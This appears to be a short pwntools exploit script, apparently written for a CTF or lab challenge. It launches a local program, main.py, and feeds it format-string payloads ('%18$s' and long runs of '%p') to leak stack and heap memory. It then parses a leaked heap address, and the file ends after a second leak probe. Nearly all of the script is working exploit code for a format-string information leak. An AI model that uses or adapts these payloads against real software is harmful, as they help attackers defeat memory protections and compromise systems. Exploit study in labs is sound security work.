import subprocess
from pwn import *

import sys
# Start the program as a subprocess
process = subprocess.Popen(['python3', './main.py'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

commit=('vulnhub\n***%18$s-%18$s***').encode()
for i in range(200):
    commit+='-%p'.encode()
commit+='\n'.encode()
process.stdin.write(commit)
# process.stdin.flush()
process.stdin.close()
process.wait()
output = process.stdout.readline()
print(output)
output = process.stdout.readline()
print(output)
output = process.stdout.readline()
print(output)

heap_=output.split(b'***')[1].split(b'-')[0]
print(heap_)
head_addr=u64(heap_.ljust(8,b'\x00'))
print(hex(head_addr))

process = subprocess.Popen(['python3', './main.py'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
# process.stdin = open('/dev/stdin', 'w')
process.stdin.write(b'%p==%p==%p==%p\n')
process.stdin.close()
output = process.stdout.readline()
print(output)
